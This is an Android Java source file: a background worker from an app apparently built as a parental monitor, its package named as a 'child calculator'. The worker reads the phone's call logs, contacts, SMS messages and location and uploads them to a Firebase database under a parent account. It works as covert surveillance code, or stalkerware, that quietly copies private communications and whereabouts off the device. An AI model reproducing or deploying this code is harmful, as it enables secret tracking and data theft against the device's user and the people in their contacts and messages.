package com.parentchild.childcalculator;

import static android.content.Context.MODE_PRIVATE;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.List;


public class UploadWorker extends Worker {

    List<CallLogModel> list;
    List<ContactModel> cList;
    List<MessageModel> mList;
    String username, uid;
    FusedLocationProviderClient client;

    public UploadWorker(
            @NonNull Context context,
            @NonNull WorkerParameters params) {
        super(context, params);
    }

    @Override
    public Result doWork() {

        ContextCompat.getMainExecutor(getApplicationContext()).execute(new Runnable() {
            @Override
            public void run() {
                getUsername();
                uploadCallLogs();
                uploadContacts();
                uploadMessages();
                getCurrentLocation();
            }
        });

        return Result.success();
    }

    void uploadCallLogs(){
        boolean callLog = ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;

        if(callLog){
            list = new FetchCallLog().fetch(getApplicationContext());
            //recent 50 call logs will be sent to the parent

            DatabaseReference delLog = FirebaseDatabase.getInstance().getReference().child("Users");
            delLog.child(uid).child("Childrens").child(username).child("CallLogs").removeValue();
            DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child("Users");
            for(int i = 0; i < list.size(); i++){
                reference.child(uid).child("Childrens").child(username).child("CallLogs").push().setValue(list.get(i));
            }
        }

    }

    public void uploadContacts() {
        boolean contact = ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;

        if(contact){
            DatabaseReference delContacts = FirebaseDatabase.getInstance().getReference().child("Users");
            delContacts.child(uid).child("Childrens").child(username).child("Contacts").removeValue();

            cList = new FetchContact().getContacts(getApplicationContext());
            DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child("Users");
            for(int i = 0; i < cList.size(); i++){
                reference.child(uid).child("Childrens").child(username).child("Contacts").push().setValue(cList.get(i));
            }
        }
    }

    public void uploadMessages() {
        boolean sms = ContextCompat.checkSelfPermission(getApplicationContext(),  Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;

        if(sms){
            DatabaseReference delMsg = FirebaseDatabase.getInstance().getReference().child("Users");
            delMsg.child(uid).child("Childrens").child(username).child("Messages").removeValue();

            mList = new FetchMessages().fetch(getApplicationContext());
            DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child("Users");
            for(int i = 0; i < mList.size(); i++){
                reference.child(uid).child("Childrens").child(username).child("Messages").push().setValue(mList.get(i));
            }
        }
    }

    void getUsername() {
        SharedPreferences sh = getApplicationContext().getSharedPreferences("MySharedPref", MODE_PRIVATE);
        username = sh.getString("username", "");
        uid = sh.getString("parentUid", "");

    }

    boolean isGpsEnabled(){
        LocationManager manager = null;
        boolean isEnabled = false;
        if(manager == null){
            manager = (LocationManager) getApplicationContext().getSystemService(android.content.Context.LOCATION_SERVICE);
        }

        isEnabled = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        return isEnabled;
    }

    void uploadLocation(Location loc){
        boolean location = ContextCompat.checkSelfPermission(getApplicationContext(),  Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if(location){
            DatabaseReference delLoc = FirebaseDatabase.getInstance().getReference().child("Users");
            delLoc.child(uid).child("Childrens").child(username).child("Locations").removeValue();

            HashMap<String, Double> data = new HashMap<String , Double>();
            data.put("latitude", loc.getLatitude());
            data.put("longitude", loc.getLongitude());
            DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child("Users");
            reference.child(uid).child("Childrens").child(username).child("Locations").push().setValue(data);
        }

    }

    void getCurrentLocation() {

        if(isGpsEnabled()) {
            client = LocationServices.getFusedLocationProviderClient(getApplicationContext());
            if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            client.getLastLocation().addOnCompleteListener(new OnCompleteListener<Location>() {
                @Override
                public void onComplete(@NonNull Task<Location> task) {
                    Location loc = task.getResult();
                    if (loc != null) {
                        uploadLocation(loc);
                    } else {
                        com.google.android.gms.location.LocationRequest req = new com.google.android.gms.location.LocationRequest()
                                .setPriority(com.google.android.gms.location.LocationRequest.PRIORITY_HIGH_ACCURACY)
                                .setInterval(10000)
                                .setFastestInterval(1000)
                                .setNumUpdates(1);

                        LocationCallback callback = new LocationCallback() {
                            @Override
                            public void onLocationResult(LocationResult locationResult) {
                                Location loc = locationResult.getLastLocation();
                                uploadLocation(loc);
                            }
                        };

                        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                            // TODO: Consider calling
                            //    ActivityCompat#requestPermissions
                            // here to request the missing permissions, and then overriding
                            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                            //                                          int[] grantResults)
                            // to handle the case where the user grants the permission. See the documentation
                            // for ActivityCompat#requestPermissions for more details.
                            return;
                        }
                        client.requestLocationUpdates(req, callback, Looper.myLooper());

                    }
                }
            });
        }
        else{
            getApplicationContext().startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
    }

}
